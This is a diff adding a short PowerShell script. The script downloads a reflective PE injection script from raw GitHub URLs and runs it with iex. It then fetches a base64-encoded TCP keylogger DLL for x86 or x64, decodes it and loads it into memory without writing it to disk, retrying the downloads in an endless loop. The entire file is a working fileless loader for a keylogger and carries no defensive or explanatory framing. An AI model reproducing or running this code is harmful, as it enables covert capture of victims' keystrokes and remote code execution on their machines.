@@ -1,0 +1,28 @@
+$x86_url = @("https://raw.githubusercontent.com/shifat627/Reflective-Pe-Injection/master/Powershell_Script/Reflective_pe_x86.ps1","https://raw.githubusercontent.com/shifat627/Windows_Keylogger/master/TCP_Keylogger_x86_dll_base64.txt")
+$x64_url = @("https://raw.githubusercontent.com/shifat627/Reflective-Pe-Injection/master/Powershell_Script/Reflective_pe_x64.ps1","https://raw.githubusercontent.com/shifat627/Windows_Keylogger/master/TCP_Keylogger_x64_dll_base64.txt")
+$script_url = if ([IntPtr]::Size -eq 8) {
+    $x64_url[0]
+}
+else {
+    $x86_url[0]
+}
+$payload_url = if ([IntPtr]::Size -eq 8) {
+    $x64_url[1]
+}
+else {
+    $x86_url[1]
+}
+$downloader = New-Object System.Net.WebClient
+while(1)
+{
+    try {
+        iex $downloader.DownloadString($script_url)
+        $data = $downloader.DownloadString($payload_url)
+        $Global:pe_bytes = [System.Convert]::FromBase64String($data)
+        break
+    }
+    catch {
+        echo "$Error[0]"
+    }
+}
+Invoke-Reflective $Global:pe_bytes
